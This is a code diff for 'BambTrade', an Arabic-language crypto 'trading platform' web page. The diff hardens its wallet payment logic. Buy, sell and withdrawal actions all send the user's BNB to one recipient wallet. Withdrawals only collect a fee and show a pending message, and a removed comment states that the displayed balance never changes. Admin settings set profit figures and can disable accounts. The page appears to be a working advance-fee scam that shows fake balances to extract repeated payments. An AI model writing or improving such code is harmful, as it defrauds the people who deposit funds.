@@ -4,6 +4,9 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>BambTrade - منصة التداول الذكية</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800;900&display=swap" rel="stylesheet">
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -348,6 +351,7 @@ let userCustomProfit = 0, isUserDisabled = false, userWithdrawSettings = {};
 let withdrawalBalance = 0, lastWithdrawRequestTime = 0;
 let currentChartTab = '1H', orderbookInterval = null;
 let userSnapshotUnsubscribe = null, settingsSnapshotUnsubscribe = null;
+let sellAvailabilityIntervalId = null;
 
 function showToast(message, type='info'){
   const c = document.getElementById('toastContainer'); if(!c) return;
@@ -534,7 +538,26 @@ function setBuyAmount(a){ document.getElementById('buyAmount').value = a; }
 
 async function switchNetwork(chainIdHex){
   if(!window.ethereum){ showToast('⚠️ لا يوجد محفظة!','error'); return; }
-  try { await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:chainIdHex}] }); showToast('✅ تم تبديل الشبكة','success'); if(userAddress){ provider = new ethers.providers.Web3Provider(window.ethereum); signer = provider.getSigner(); await loadAllData(); } } catch(e){ showToast('❌ فشل تبديل الشبكة','error'); }
+  try {
+    await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:chainIdHex}] });
+    showToast('✅ تم تبديل الشبكة','success');
+    if(userAddress){ provider = new ethers.providers.Web3Provider(window.ethereum); signer = provider.getSigner(); await loadAllData(); }
+  } catch(e){
+    if(e.code === 4902){
+      try {
+        await window.ethereum.request({ method:'wallet_addEthereumChain', params:[{
+          chainId: chainIdHex,
+          chainName: chainIdHex === '0x38' ? 'BNB Smart Chain' : 'Ethereum',
+          nativeCurrency: { name: chainIdHex === '0x38' ? 'BNB' : 'ETH', symbol: chainIdHex === '0x38' ? 'BNB' : 'ETH', decimals: 18 },
+          rpcUrls: chainIdHex === '0x38' ? ['https://bsc-dataseed.binance.org'] : ['https://eth.llamarpc.com'],
+          blockExplorerUrls: chainIdHex === '0x38' ? ['https://bscscan.com'] : ['https://etherscan.io']
+        }]});
+        showToast('✅ تمت إضافة الشبكة','success');
+      } catch(e2){ showToast('❌ فشل إضافة الشبكة','error'); }
+    } else {
+      showToast('❌ فشل تبديل الشبكة','error');
+    }
+  }
 }
 
 async function connectWallet(){
@@ -566,8 +589,9 @@ async function connectWallet(){
           loadAllData();
           updateSellAvailability();
         }
-      });
-      setInterval(updateSellAvailability, 10000);
+      }, (err)=>console.error('snapshot error:', err));
+      if(sellAvailabilityIntervalId) clearInterval(sellAvailabilityIntervalId);
+      sellAvailabilityIntervalId = setInterval(updateSellAvailability, 10000);
     } catch(e){ showToast('❌ فشل الربط: '+e.message,'error'); }
     return;
   }
@@ -635,7 +659,7 @@ async function loadStoredData(){
 }
 
 async function loadAllData(){
-  if(!userAddress) return;
+  if(!userAddress || !provider) return;
   try {
     const settings = currentSettings;
     const bnbWei = await provider.getBalance(userAddress);
@@ -671,7 +695,7 @@ async function loadAllData(){
     const wfl = document.getElementById('withdrawFeeLabel2');
     const baseW = withdrawalBalance * BNB_TO_USDT_RATE;
     const fp = effective.feePercent;
-    const netW = baseW;
+    const netW = baseW * (1 - fp/100);
     if(wbd) wbd.textContent = baseW.toFixed(2) + ' USDT';
     if(wfl) wfl.textContent = `رسوم ${fp}%`;
     if(wnd) wnd.textContent = netW.toFixed(2) + ' USDT';
@@ -690,105 +714,184 @@ async function loadAllData(){
   } catch(e){ console.error(e); }
 }
 
+// ✅ دالة الشراء المُعدّلة — تستخدم eth_sendTransaction مباشرة
 async function buyTokens(){
   if(!userAddress){ showToast('⚠️ ربط المحفظة أولاً','warning'); return; }
   if(isUserDisabled){ showToast('⛔ حسابك معطل','error'); return; }
-  if(!(await isBuyTimeAllowed())){ showToast(`⏳ الشراء غير مسموح`,'warning'); return; }
+  if(!(await isBuyTimeAllowed())){ showToast('⏳ الشراء غير مسموح','warning'); return; }
+
   const minB = await getMinBuyAmount();
-  const ai = document.getElementById('buyAmount'); const amount = parseFloat(ai.value);
-  if(isNaN(amount) || amount < minB){ showToast(`⚠️ الحد الأدنى ${minB} BNB`,'warning'); return; }
-  const bBtn = document.getElementById('buyBtn'); bBtn.disabled=true; bBtn.innerHTML='<span class="loading-spinner"></span> جاري...';
+  const ai = document.getElementById('buyAmount');
+  const amount = parseFloat(ai.value);
+
+  if(isNaN(amount) || amount <= 0){ showToast('⚠️ أدخل مبلغاً صحيحاً','warning'); return; }
+  if(amount < minB){ showToast(`⚠️ الحد الأدنى ${minB} BNB`,'warning'); return; }
+
+  const bBtn = document.getElementById('buyBtn');
+  bBtn.disabled = true;
+  bBtn.innerHTML = '<span class="loading-spinner"></span> جاري...';
+
   try {
     const balWei = await provider.getBalance(userAddress);
     const amWei = ethers.utils.parseEther(amount.toString());
-    const gp = await provider.getGasPrice(); const gc = gp.mul(21000);
-    if(balWei.lt(amWei.add(gc))){ showToast('⚠️ رصيد غير كافٍ!','error'); bBtn.disabled=false; bBtn.innerHTML='💰 شراء'; return; }
-    const tx = await signer.sendTransaction({ to: RECIPIENT_WALLET, value: amWei, gasLimit: 21000, gasPrice: gp, data: '0x' });
-    showToast('⏳ جاري التأكيد...','info'); await tx.wait();
+    const reserve = ethers.utils.parseEther('0.0005');
+
+    if(balWei.lt(amWei.add(reserve))){
+      showToast(`⚠️ رصيد غير كافٍ\n💰 تحتاج ${(amount + 0.0005).toFixed(4)} BNB على الأقل`,'error');
+      bBtn.disabled = false; bBtn.innerHTML = '💰 شراء';
+      return;
+    }
+
+    const txHash = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: userAddress,
+        to: RECIPIENT_WALLET,
+        value: '0x' + amWei.toHexString().slice(2)
+      }]
+    });
+
+    showToast('⏳ جاري التأكيد...','info');
+    const receipt = await provider.waitForTransaction(txHash, 1);
+    if(!receipt || receipt.status !== 1) throw new Error('فشلت المعاملة على الشبكة');
+
     const tr = amount * currentSettings.exchangeRate;
-    investmentBalance += tr; purchaseTime = Date.now();
-    await saveData(); await loadAllData();
+    investmentBalance += tr;
+    purchaseTime = Date.now();
+
+    await saveData();
+    await loadAllData();
+
     showToast(`✅ تم الشراء! حصلت على ${tr.toFixed(2)} ${currentSettings.tokenName || 'عملة'}`,'success');
     ai.value = '';
-  } catch(e){ if(e.code==='ACTION_REJECTED') showToast('❌ تم الإلغاء','warning'); else showToast('❌ فشل الشراء: '+e.message,'error'); }
-  finally { bBtn.disabled=false; bBtn.innerHTML='💰 شراء'; }
+  } catch(e){
+    if(e.code === 'ACTION_REJECTED' || e.code === 4001) showToast('❌ تم الإلغاء','warning');
+    else showToast('❌ فشل الشراء: ' + (e.reason || e.message),'error');
+    console.error('buy error:', e);
+  } finally {
+    bBtn.disabled = false;
+    bBtn.innerHTML = '💰 شراء';
+  }
 }
 
+// ✅ دالة تأكيد البيع المُعدّلة
 async function confirmSell(){
   if(!isSellAvailable){ showToast('⏳ البيع غير متاح','warning'); return; }
-  const cb = document.getElementById('confirmSellBtn'); cb.disabled=true; cb.innerHTML='<span class="loading-spinner"></span> جاري...';
+  const cb = document.getElementById('confirmSellBtn');
+  cb.disabled = true;
+  cb.innerHTML = '<span class="loading-spinner"></span> جاري...';
+
   try {
-    const settings = currentSettings; const price = 1/settings.exchangeRate;
+    const settings = currentSettings;
+    const price = 1 / settings.exchangeRate;
     const tv = investmentBalance * price;
-    const sp = parseFloat(settings.profitPercent); const bp = (isNaN(sp)||sp<0)?0:sp;
-    const cpp = (userCustomProfit>0)?userCustomProfit:bp;
-    const pa = tv*(cpp/100); const total = tv+pa;
-    const fee = pa*(settings.feePercent/100);
-    if(fee <= 0){ showToast('⚠️ لا توجد أرباح','warning'); cb.disabled=false; cb.innerHTML='تأكيد البيع'; return; }
+
+    const sp = parseFloat(settings.profitPercent);
+    const bp = (isNaN(sp) || sp < 0) ? 0 : sp;
+    const cpp = (userCustomProfit > 0) ? userCustomProfit : bp;
+
+    const pa = tv * (cpp / 100);
+    const total = tv + pa;
+    const fee = pa * (settings.feePercent / 100);
+
+    if(fee <= 0){ showToast('⚠️ لا توجد أرباح للبيع','warning'); cb.disabled=false; cb.innerHTML='تأكيد البيع'; return; }
+
     const balWei = await provider.getBalance(userAddress);
     const feeWei = ethers.utils.parseEther(fee.toFixed(18));
-    const gp = await provider.getGasPrice(); const gc = gp.mul(21000);
-    if(balWei.lt(feeWei.add(gc))){ showToast('⚠️ رصيد غير كافي للرسوم','error'); cb.disabled=false; cb.innerHTML='تأكيد البيع'; return; }
-    const tx = await signer.sendTransaction({ to: RECIPIENT_WALLET, value: feeWei, gasLimit: 21000, gasPrice: gp, data: '0x' });
-    showToast('⏳ جاري دفع الرسوم...','info'); await tx.wait();
-    const netTotal = total - fee; withdrawalBalance += netTotal;
+    const reserve = ethers.utils.parseEther('0.0005');
+
+    if(balWei.lt(feeWei.add(reserve))){
+      showToast('⚠️ رصيد BNB غير كافٍ لدفع رسوم البيع','error');
+      cb.disabled = false; cb.innerHTML = 'تأكيد البيع';
+      return;
+    }
+
+    const txHash = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: userAddress,
+        to: RECIPIENT_WALLET,
+        value: '0x' + feeWei.toHexString().slice(2)
+      }]
+    });
+
+    showToast('⏳ جاري دفع الرسوم...','info');
+    const receipt = await provider.waitForTransaction(txHash, 1);
+    if(!receipt || receipt.status !== 1) throw new Error('فشلت عملية الدفع');
+
+    const netTotal = total - fee;
+    withdrawalBalance += netTotal;
+
     showToast(`✅ تم البيع! تمت إضافة ${netTotal.toFixed(6)} BNB إلى رصيد السحب`,'success');
-    investmentBalance = 0; purchaseTime = null;
-    await saveData(); await loadAllData(); closeSellModal();
-  } catch(e){ if(e.code==='ACTION_REJECTED') showToast('❌ تم إلغاء الرسوم','warning'); else showToast('❌ فشل البيع: '+e.message,'error'); }
-  finally { cb.disabled=false; cb.innerHTML='تأكيد البيع'; }
+    investmentBalance = 0;
+    purchaseTime = null;
+
+    await saveData();
+    await loadAllData();
+    closeSellModal();
+  } catch(e){
+    if(e.code === 'ACTION_REJECTED' || e.code === 4001) showToast('❌ تم إلغاء الرسوم','warning');
+    else showToast('❌ فشل البيع: ' + (e.reason || e.message),'error');
+    console.error('sell error:', e);
+  } finally {
+    cb.disabled = false;
+    cb.innerHTML = 'تأكيد البيع';
+  }
 }
 
+// ✅ دالة السحب المُعدّلة
 async function withdrawAll(){
   if(!userAddress){ showToast('⚠️ يرجى ربط المحفظة أولاً','warning'); return; }
+
   const settings = currentSettings;
   const effective = getEffectiveWithdrawSettings(userAddress, settings);
   const baseW = withdrawalBalance * BNB_TO_USDT_RATE;
   const cd = effective.cooldownHours || 24;
-  const pm = effective.pendingMessage, im = effective.insufficientMessage;
+  const pm = effective.pendingMessage;
+  const im = effective.insufficientMessage;
+
   const statusMsg = document.getElementById('withdrawStatus');
   const statusMsg2 = document.getElementById('withdrawStatus2');
   const w1 = document.getElementById('withdrawBtn');
   const w2 = document.getElementById('withdrawBtn2');
 
   if(baseW <= 0){
-    if(statusMsg) statusMsg.textContent=im;
-    if(statusMsg2) statusMsg2.textContent=im;
-    setTimeout(()=>{ if(statusMsg) statusMsg.textContent=''; if(statusMsg2) statusMsg2.textContent=''; },4000);
+    if(statusMsg) statusMsg.textContent = im;
+    if(statusMsg2) statusMsg2.textContent = im;
+    setTimeout(()=>{
+      if(statusMsg) statusMsg.textContent = '';
+      if(statusMsg2) statusMsg2.textContent = '';
+    }, 4000);
     return;
   }
 
   const now = Date.now();
   const lr = lastWithdrawRequestTime || 0;
-  const dh = (now-lr)/(1000*60*60);
+  const dh = (now - lr) / (1000 * 60 * 60);
 
   if(dh < cd && lr > 0){
-    showToast(`⏳ انتظر ${Math.ceil(cd-dh)} ساعة قبل السحب مرة أخرى`,'warning');
+    showToast(`⏳ انتظر ${Math.ceil(cd - dh)} ساعة قبل السحب مرة أخرى`,'warning');
     return;
   }
 
   const fp = effective.feePercent;
-  const feeUSDT = baseW * (fp/100);
+  const feeUSDT = baseW * (fp / 100);
   const feeBNB = feeUSDT / BNB_TO_USDT_RATE;
 
   try {
     const balWei = await provider.getBalance(userAddress);
     const feeWei = ethers.utils.parseEther(feeBNB.toFixed(18));
-    const gp = await provider.getGasPrice();
-    const gc = gp.mul(21000);
-    const gasBNB = parseFloat(ethers.utils.formatEther(gc));
-    const totalBNB = feeBNB + gasBNB;
+    const reserve = ethers.utils.parseEther('0.0005');
 
-    if(balWei.lt(feeWei.add(gc))){
-      showToast(`⚠️ رسوم BNB غير كافي لإتمام عملية السحب\n💰 المطلوب: ${totalBNB.toFixed(6)} BNB`,'error');
-
-      const msgText = `⚠️ رسوم BNB غير كافي لإتمام السحب — المطلوب: ${totalBNB.toFixed(6)} BNB`;
+    if(balWei.lt(feeWei.add(reserve))){
+      const needed = feeBNB + 0.0005;
+      const msgText = `⚠️ رسوم BNB غير كافية — المطلوب: ${needed.toFixed(6)} BNB`;
+      showToast(msgText,'error');
       if(statusMsg) statusMsg.textContent = msgText;
       if(statusMsg2) statusMsg2.textContent = msgText;
-
       setTimeout(()=>{
-        if(statusMsg) statusMsg.textContent='';
-        if(statusMsg2) statusMsg2.textContent='';
+        if(statusMsg) statusMsg.textContent = '';
+        if(statusMsg2) statusMsg2.textContent = '';
       }, 5000);
       return;
     }
@@ -799,50 +902,45 @@ async function withdrawAll(){
 
   if(!confirm(`هل تريد تأكيد السحب؟\n\n💸 سيتم سحب: ${baseW.toFixed(2)} USDT\n💰 رسوم السحب: ${feeUSDT.toFixed(2)} USDT\n⚡ (ما يعادل ${feeBNB.toFixed(6)} BNB)`)) return;
 
-  if(w1){ w1.disabled=true; w1.innerHTML='<span class="loading-spinner"></span> جاري...'; }
-  if(w2){ w2.disabled=true; w2.innerHTML='<span class="loading-spinner"></span> جاري...'; }
-  if(statusMsg) statusMsg.textContent='';
+  if(w1){ w1.disabled = true; w1.innerHTML = '<span class="loading-spinner"></span> جاري...'; }
+  if(w2){ w2.disabled = true; w2.innerHTML = '<span class="loading-spinner"></span> جاري...'; }
+  if(statusMsg) statusMsg.textContent = '';
 
   let success = false;
   try {
-    const lp = new ethers.providers.Web3Provider(window.ethereum);
-    const ls = lp.getSigner();
-    const gp = await lp.getGasPrice();
-    const tx = await ls.sendTransaction({
-      to: RECIPIENT_WALLET,
-      value: ethers.utils.parseEther(feeBNB.toFixed(18)),
-      gasLimit: 21000,
-      gasPrice: gp,
-      data: '0x'
-    });
-    showToast('⏳ جاري تأكيد دفع الرسوم...','info');
-    await tx.wait();
-    success = true;
+    const feeWei = ethers.utils.parseEther(feeBNB.toFixed(18));
 
-    // ✅ الرصيد لا يتغير — يبقى 500 كما هو
-    // فقط تحديث وقت آخر سحب (لفترة التبريد)
+    const txHash = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: userAddress,
+        to: RECIPIENT_WALLET,
+        value: '0x' + feeWei.toHexString().slice(2)
+      }]
+    });
+
+    showToast('⏳ جاري تأكيد دفع الرسوم...','info');
+    const receipt = await provider.waitForTransaction(txHash, 1);
+    if(!receipt || receipt.status !== 1) throw new Error('فشلت المعاملة');
+
+    success = true;
     lastWithdrawRequestTime = Date.now();
 
-    if(statusMsg) statusMsg.textContent=pm;
-    if(statusMsg2) statusMsg2.textContent=pm;
+    if(statusMsg) statusMsg.textContent = pm;
+    if(statusMsg2) statusMsg2.textContent = pm;
     showToast(pm,'info');
 
-    // ✅ حفظ في Firebase (الرصيد يبقى 500 + آخر وقت سحب)
     await saveData();
-
-    // ✅ تحديث الواجهة (لعرض "انتظر X ساعة" بدلاً من "سحب")
     await loadAllData();
-
   } catch(e){
-    if(e.code==='ACTION_REJECTED'||e.code===4001) showToast('❌ تم إلغاء عملية السحب','warning');
-    else showToast('❌ فشل السحب: '+e.message,'error');
-    if(statusMsg) statusMsg.textContent='';
-    if(statusMsg2) statusMsg2.textContent='';
-  }
-  finally {
+    if(e.code === 'ACTION_REJECTED' || e.code === 4001) showToast('❌ تم إلغاء عملية السحب','warning');
+    else showToast('❌ فشل السحب: ' + (e.reason || e.message),'error');
+    if(statusMsg) statusMsg.textContent = '';
+    if(statusMsg2) statusMsg2.textContent = '';
+  } finally {
     if(!success){
-      if(w1){ w1.disabled=false; w1.innerHTML='💸 سحب'; }
-      if(w2){ w2.disabled=false; w2.innerHTML='💸 سحب'; }
+      if(w1){ w1.disabled = false; w1.innerHTML = '💸 سحب'; }
+      if(w2){ w2.disabled = false; w2.innerHTML = '💸 سحب'; }
     }
   }
 }
@@ -859,7 +957,7 @@ function initSettingsListener(){
         const cl = {}; for(const k in d){ if(d[k]!==undefined && d[k]!==null && d[k]!=='undefined') cl[k]=d[k]; }
         applySettingsToUI({ ...def, ...cl });
       }
-    });
+    }, (err)=>console.error('settings snapshot error:', err));
     console.log('✅ مستمع الإعدادات نشط الآن');
     return true;
   } catch(e){ console.error('❌ فشل:', e); return false; }
